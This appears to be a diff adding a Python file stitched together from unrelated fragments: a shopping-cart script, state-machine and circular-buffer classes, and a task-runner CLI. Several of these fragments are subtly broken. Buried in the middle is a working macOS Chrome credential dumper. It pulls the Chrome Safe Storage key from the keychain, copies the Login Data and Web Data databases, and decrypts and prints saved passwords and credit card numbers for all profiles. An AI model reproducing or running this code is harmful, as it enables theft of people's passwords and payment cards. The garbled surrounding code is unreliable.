@@ -1,0 +1,658 @@
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+class Item:
+    """creating an item class, so that I can attach its name, price and quantity by providing a list with those values,
+    but quantity is automatically 0 if not supplied, since our file with store items only has name and price in it"""
+
+    def __init__(self, input_list):
+        self.name = input_list[0]
+        self.price = int(input_list[1])
+        if len(input_list) == 2:
+            self.quantity = 0
+        elif len(input_list) == 3:
+            self.quantity = int(input_list[2])
+
+
+class ShoppingCart:
+    """creating a shopping cart class where we will put all our items that we buy and it contains the functions which
+    manage cart contents"""
+    cart_items = []   # list of Item objects
+
+    def __init__(self):
+        pass
+
+    def add_item(self, item_to_add, amount):
+        """method that adds item to the cart, with an input of Item object and the amount we want to add"""
+        if item_to_add not in self.cart_items:
+            self.cart_items.append(item_to_add)
+            item_to_add.quantity = amount
+            
+        else:
+            
+            decision = decision.lower()
+            if decision == 'y' or decision == 'yes':
+                item_to_add.quantity += amount
+                
+            elif decision == 'n' or decision == 'no':
+                print("ok, I won't add more")
+            else:
+                print("i don't know what you mean, but I'll take that as no")
+
+    def remove_item(self, item_to_remove, amount):
+        """method that removes item objects from the cart, same concept as add_item"""
+        if item_to_remove in self.cart_items:
+            if amount > item_to_remove.quantity:
+                print("you don't even have that many, i'll just remove all of that item")
+                item_to_remove.quantity = 0
+                del self.cart_items[self.cart_items.index(item_to_remove)]
+            elif (item_to_remove.quantity - amount) == 0:
+                item_to_remove.quantity = 0
+                del self.cart_items[self.cart_items.index(item_to_remove)]
+                print("ok, removed")
+            else:
+                item_to_remove.quantity -= amount
+                print("ok, removed")
+        else:
+            print(" is not in the cart")
+
+    def check_cart(self):
+        """method that prints item objects that are currently in the cart and calculates the total price"""
+        print('this is your cart content:')
+        total_price = 0
+        products = []  # list of items
+        for product in self.cart_items:
+            print('')
+            products.append(product.name)
+            total_price += product.price * product.quantity
+        print('total price')
+
+    def empty_cart(self):
+        """method that deletes all items from the cart, by resetting the cart list"""
+        self.cart_items = []
+        print('ok, cart is now empty')
+
+
+def print_store_items(items_list):
+    """function that prints item objects in the store from the file supplied, takes a list of item objects"""
+    print('these are the products that we have and their prices:')
+    for store_item in items_list:
+        print('')
+
+
+def get_products(user_cart):
+    """function that makes a dictionary of items that were bought and how many, so that they can put in a file, takes
+    a ShoppingCart object"""
+    cart_products = {}
+    for cart_product in user_cart.cart_items:
+        cart_products[cart_product.name] = cart_product.quantity
+    return cart_products
+
+
+def read_file(file_name):
+    """function that opens a file with items and makes a list from each row, and converts it to an Item object, requires
+    the name of the file that needs to be read"""
+    read_items = []
+    items_file = open(file_name, 'r')
+    item_line = items_file.readline().strip("\n")
+    while not (item_line == "" or item_line is None):
+        read_items.append(Item(item_line.split(";")))
+        item_line = items_file.readline().strip("\n")
+    items_file.close()
+    return read_items
+
+def menu_selector(menu_list, prompt="Please select an option:"):
+    if not hasattr(menu_list, "__iter__"):
+        print("ERROR - Given menu not a list")
+        exit(-1)
+    if len(menu_list) < 1:
+        print("ERROR - Given menu is empty")
+        exit(-1)
+    for menu_item in menu_list:
+        if not isinstance(menu_item, str):
+            print("ERROR - Menu contains non-string items")
+            exit(-1)
+    print(prompt)
+    for item_index in range(len(menu_list)):
+        print(str(item_index+1) + " - " + menu_list[item_index])
+    return get_number(1, len(menu_list), "", True)
+
+from time import sleep
+from types import FunctionType as FT
+
+class MicroIosPyStateMachine:
+    """
+    Class to aid in using state machines with defined functions for each state.
+    """
+    def __init__(self, numStates = 0):
+        self.numStates = numStates
+        self.stateBindings = []
+        self.argList = []
+        self.metaData = {}
+        self.currentState = None
+        self.internalLooping = False
+        self.loopDelay = 0
+
+    def checkBindings(self):
+        """
+        Checks if state binding list is populated with the correct number of states of all function type.
+        :return: boolean
+        """
+        if self.numStates == 0:
+            print("Error: zero states found.")
+            return False
+        elif len(self.stateBindings) != self.numStates:
+            print("Error: missing state binding.")
+            return False
+        elif not all(isinstance(x, FT) for x in self.stateBindings):
+            print("Error: invalid state binding.")
+            return False
+        return True
+
+    def run(self):
+        """
+        Runs a single iteration of the state machine based on the current state. Takes output from functions to
+            determine next state as well as create an argument list for the next state's function call.
+        :return: Nothing.
+        """
+        if self.checkBindings():
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+
+    def run_InternalLoop(self, startState = None):
+        """
+        Creates an internal loop that iterates through the state machine in the same manner as the run() method.
+            Requires a returned negative value as the next state to stop internal looping.
+        :param startState: Optional starting state value.
+        :return:
+        """
+        if not self.checkBindings():
+            return
+        if startState is not None:
+            if type(startState) is int and 0 <= startState < self.numStates:
+                self.currentState = startState
+            else:
+                print("Error: invalid start state.")
+                return
+
+        self.internalLooping = True
+        while self.internalLooping:
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+            if self.currentState < 0:
+                self.internalLooping = False
+                return
+            sleep(self.loopDelay)
+
+class MicroIosPyBuffer:
+    """
+    Class wrapper for a simple circular buffer.
+    """
+    def __init__(self, length, overwrite=True, readChronological=True):
+        self.length = length
+        self.buffer = []
+        self.writer = 0
+        self.reader = 0
+        self.overwrite = overwrite
+        self.readChronological = readChronological
+        self.ready = None
+
+        self.typeCheck()
+        self.initBuffer()
+
+    def typeCheck(self):
+        """
+        Checks if necessary fields for the buffer are of the correct type. Will set ready status to true if all fields
+            meet the requirements.
+        :return: Nothing.
+        """
+        self.ready = True
+
+        if not type(self.length) is int:
+            print("Error: invalid length argument type.")
+            self.ready = False
+        if not type(self.overwrite) is type(False):
+            print("Error: invalid overwrite argument type.")
+            self.ready = False
+        if not type(self.readChronological) is type(False):
+            print("Error: invalid readChronological argument type.")
+            self.ready = False
+
+        print("Ready Status: ", self.ready)
+
+
+    def initBuffer(self):
+        """
+        Initializes buffer with all None value types.
+        :return: Nothing.
+        """
+        for i in range(self.length):
+            self.buffer[i] = None
+
+    def reset(self):
+        """
+        Resets buffer to initial conditions and resets cursors to 0.
+        :return: Nothing.
+        """
+        self.initBuffer()
+        self.reader = 0
+        self.writer = 0
+
+    def isReady(self):
+        """
+        Returns True if parameters for the buffer are of correct type, otherwise False.
+        :return: Boolean.
+        """
+        return self.ready
+
+    def isReadable(self):
+        """
+        Returns True if there is any data in the buffer, otherwise False.
+        :return: Boolean.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.buffer[self.reader] is None:
+            return False
+        else:
+            return True
+
+    def isWriteable(self):
+        """
+        Returns True if there is an open spot to write data in the buffer or if overwrite is allowed.
+        :return: Boolean.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.overwrite:
+            return True
+        elif self.buffer[self.writer] is None:
+            return True
+        else:
+            return False
+
+    def toggleOverwrite(self):
+        """
+        Toggles overwrite status.
+        :return: Nothing.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        self.overwrite = not self.overwrite
+
+    def toggleReadChronological(self):
+        """
+        Toggles readChronological status.
+        :return: Nothing.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        self.readChronological = not self.readChronological
+
+    def add(self, data):
+        """
+        Adds piece of data to the next writeable spot in the buffer, then increments writer cursor. If failed, cursor
+            does not increment.
+        :param data: Data to be added.
+        :return: True for success, False for failure.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.buffer[self.writer] is None:
+            self.buffer[self.writer] = data
+            self.writer = (self.writer + 1) % self.length
+            return True
+        elif self.overwrite:
+            self.buffer[self.writer] = data
+            self.writer = (self.writer + 1) % self.length
+            if self.readChronological:
+                self.reader = (self.writer + 1) % self.length
+            return True
+        else:
+            return False
+
+import sqlite3
+import binascii
+import subprocess
+import base64
+import operator
+import tempfile
+import sys
+import shutil
+import glob
+import hmac
+import struct
+import itertools
+
+def pbkdf2_bin(password, salt, iterations, keylen=16):
+    _pack_int = struct.Struct('>I').pack
+    hashfunc = sha1
+    mac = hmac.new(password, None, hashfunc)
+
+    def _pseudorandom(x, mac=mac):
+        h = mac.copy()
+        h.update(x)
+        return map(ord, h.digest())
+
+    buf = []
+    for block in range(1, -(-keylen // mac.digest_size) + 1):
+        rv = u = _pseudorandom(salt + _pack_int(block))
+        for i in range(iterations - 1):
+            u = _pseudorandom(''.join(map(chr, u)))
+            rv = itertools.starmap(operator.xor, itertools.izip(rv, u))
+        buf.extend(rv)
+    return ''.join(map(chr, buf))[:keylen]
+
+
+try:
+    from hashlib import pbkdf2_hmac
+except ImportError:
+    pbkdf2_hmac = pbkdf2_bin
+    from hashlib import sha1
+
+
+def chrome_decrypt(encrypted, safe_storage_key):
+    """
+    AES decryption using the PBKDF2 key and 16x ' ' IV
+    via openSSL (installed on OSX natively)
+
+    salt, iterations, iv, size @
+    https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
+    """
+
+    iv = ''.join(('20', ) * 16)
+    key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
+
+    hex_key = binascii.hexlify(key)
+    hex_enc_password = base64.b64encode(encrypted[3:])
+
+    # send any error messages to /dev/null to prevent screen bloating up
+    # (any decryption errors will give a non-zero exit, causing exception)
+    try:
+        decrypted = subprocess.check_output(
+            "openssl enc -base64 -d "
+            "-aes-128-cbc -iv '{}' -K {} <<< "
+            "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
+            shell=True)
+    except subprocess.CalledProcessError:
+        decrypted = "Error decrypting this data"
+
+    return decrypted
+
+
+def chrome_db(chrome_data, content_type):
+    """
+    Queries the chrome database (either Web Data or Login Data)
+    and returns a list of dictionaries, with the keys specified
+    in the list assigned to keys.
+
+    @type chrome_data: list
+    @param chrome_data: POSIX path to chrome database with login / cc data
+    @type content_type: string
+    @param content_type: specify what kind of database it is (login or cc)
+
+    @rtype: list
+    @return: list of dictionaries with keys specified in the keys variable
+             and the values retrieved from the DB.
+    """
+    # work around for locking DB
+    copy_path = tempfile.mkdtemp()
+    with open(chrome_data, 'r') as content:
+        dbcopy = content.read()
+    with open("{}/chrome".format(copy_path), 'w') as content:
+        # if chrome is open, the DB will be locked
+        # so get around this by making a temp copy
+        content.write(dbcopy)
+
+    database = sqlite3.connect("{}/chrome".format(copy_path))
+
+    if content_type == "Web Data":
+        sql = ("select name_on_card, card_number_encrypted, expiration_month, "
+               "expiration_year from credit_cards")
+        keys = ["name", "card", "exp_m", "exp_y"]
+
+    else:
+        sql = "select username_value, password_value, origin_url from logins"
+        keys = ["user", "pass", "url"]
+
+    db_data = []
+    with database:
+        for values in database.execute(sql):
+            if not values[0] or (values[1][:3] != b'v10'):
+                continue
+            else:
+                db_data.append(dict(zip(keys, values)))
+    shutil.rmtree(copy_path)
+
+    return db_data
+
+
+def utfout(inputvar):
+    """
+    Cleans a variable for UTF8 encoding on some enviroments
+    """
+    if isinstance(inputvar, (int, float, complex)):
+        return str(inputvar)
+    try:
+        return inputvar.encode(sys.stdout.encoding, errors='replace')
+    except TypeError:
+        try:
+            return str(inputvar).encode('utf-8')
+        except AttributeError:
+            return inputvar
+    except AttributeError:
+        return inputvar
+    return inputvar # assume it was already utf-8
+
+
+def chrome(chrome_data, safe_storage_key):
+    """
+    Calls the database querying and decryption functions
+    and displays the output in a neat and ordered fashion
+    (with colors)
+
+    @type chrome_data: list
+    @param chrome_data: POSIX path to chrome database with login / cc data
+    @type safe_storage_key: string
+    @param safe_storage_key: key from keychain that will be used to
+                             derive AES key.
+
+    @rtype: None
+    @return: None. All data is printed in this function, which is it's primary
+             function.
+    """
+    for profile in chrome_data:
+        # web data -> credit cards
+        # login data -> login data
+
+        green = "\033[32m"
+        violet = "\033[35m"
+        blue = "\033[34m"
+        bold = "\033[1m"
+        end = "\033[0m"
+
+        if "Web Data" in profile:
+            db_data = chrome_db(profile, "Web Data")
+
+            print("{}Credit Cards for Chrome "
+                  "Profile{} -> [{}{}{}]".format(blue, end, violet,
+                                                 profile.split("/")[-2], end))
+
+            for i, entry in enumerate(db_data):
+                entry["card"] = chrome_decrypt(entry["card"], safe_storage_key)
+                cc_dict = {
+                    '3': 'AMEX',
+                    '4': 'Visa',
+                    '5': 'Mastercard',
+                    '6': 'Discover'
+                }
+
+                brand = "Unknown Card Issuer"
+                if entry["card"][0] in cc_dict:
+                    brand = cc_dict[entry["card"][0]]
+
+                print("  {}[{}]{} {}{}{}".format(green, i + 1, end, bold,
+                                                 brand, end))
+                print("\t{}Card Holder{}: {}".format(green, end,
+                                                     utfout(entry["name"])))
+                print("\t{}Card Number{}: {}".format(green, end,
+                                                     utfout(entry["card"])))
+                print("\t{}Expiration{}: {}/{}".format(green, end,
+                                                       utfout(entry["exp_m"]),
+                                                       utfout(entry["exp_y"])))
+
+        else:
+            db_data = chrome_db(profile, "Login Data")
+
+            print("{}Passwords for Chrome "
+                  "Profile{} -> [{}{}{}]".format(blue, end, violet,
+                                                 profile.split("/")[-2], end))
+
+            for i, entry in enumerate(db_data):
+                entry["pass"] = chrome_decrypt(entry["pass"], safe_storage_key)
+
+                print("  {}[{}]{} {}{}{}".format(green, i + 1, end, bold,
+                                                 utfout(entry["url"]), end))
+                print("\t{}User{}: {}".format(green, end, utfout(
+                    entry["user"])))
+                print("\t{}Pass{}: {}".format(green, end, utfout(
+                    entry["pass"])))
+
+
+if __name__ == '__main__':
+    root_path = "/Users/*/Library/Application Support/Google/Chrome"
+    login_data_path = "{}/*/Login Data".format(root_path)
+    cc_data_path = "{}/*/Web Data".format(root_path)
+    chrome_data = glob.glob(login_data_path) + glob.glob(cc_data_path)
+    safe_storage_key = subprocess.Popen(
+        "security find-generic-password -wa "
+        "'Chrome'",
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        shell=True)
+    stdout, stderr = safe_storage_key.communicate()
+
+    if stderr:
+        print("Error: {}. Chrome entry not found in keychain?".format(stderr))
+        sys.exit()
+    if not stdout:
+        print("User clicked deny.")
+
+    safe_storage_key = stdout.replace("\n", "")
+    chrome(chrome_data, safe_storage_key)
+
+import code
+import sys
+import os
+import os.path
+import glob
+import subprocess
+import functools
+    
+def start_interpreter(**variables):
+    # add the current working directory to the sys paths
+    sys.path.append(os.getcwd())
+    console = type("shopify ", (code.InteractiveConsole, object), {})
+    import readline
+
+    console(variables).interact()
+
+
+class ConfigFileError(Exception):
+    pass
+
+
+def usage(usage_string):
+    """Decorator to add a usage string to a function"""
+
+    def decorate(func):
+        func.usage = usage_string
+        return func
+
+    return decorate
+
+
+class TasksMeta(type):
+    _prog = os.path.basename(sys.argv[0])
+
+    def __new__(mcs, name, bases, new_attrs):
+        cls = type.__new__(mcs, name, bases, new_attrs)
+
+        tasks = list(new_attrs.keys())
+        tasks.append("help")
+
+        def filter_func(item):
+            return not item.startswith("_") and hasattr(getattr(cls, item), "__call__")
+
+        tasks = filter(filter_func, tasks)
+        cls._tasks = sorted(tasks)
+
+        return cls
+
+    def run_task(cls, task=None, *args):
+        if task in [None, "-h", "--help"]:
+            cls.help()
+            return
+
+        # Allow unambiguous abbreviations of tasks
+        if task not in cls._tasks:
+            matches = filter(lambda item: item.startswith(task), cls._tasks)
+            list_of_matches = list(matches)
+            if len(list_of_matches) == 1:
+                task = list_of_matches[0]
+            else:
+                sys.stderr.write('Could not find task "%s".\n' % (task))
+
+        task_func = getattr(cls, task)
+        task_func(*args)
+
+    @usage("help [TASK]")
+    def help(cls, task=None):
+        """Describe available tasks or one specific task"""
+        if task is None:
+            usage_list = []
+            for task in iter(cls._tasks):
+                task_func = getattr(cls, task)
+                usage_string = "  %s %s" % (cls._prog, task_func.usage)
+                desc = task_func.__doc__.splitlines()[0]
+                usage_list.append((usage_string, desc))
+            max_len = functools.reduce(lambda m, item: max(m, len(item[0])), usage_list, 0)
+            print("Tasks:")
+            cols = int(os.environ.get("COLUMNS", 80))
+            for line, desc in usage_list:
+                task_func = getattr(cls, task)
+                if desc:
+                    line = "%s%s  # %s" % (line, " " * (max_len - len(line)), desc)
+                if len(line) > cols:
+                    line = line[: cols - 3] + "..."
+                print(line)
+        else:
+            task_func = getattr(cls, task)
+            print("Usage:")
+            print("  %s %s" % (cls._prog, task_func.usage))
+            print("")
+            print(task_func.__doc__)
+
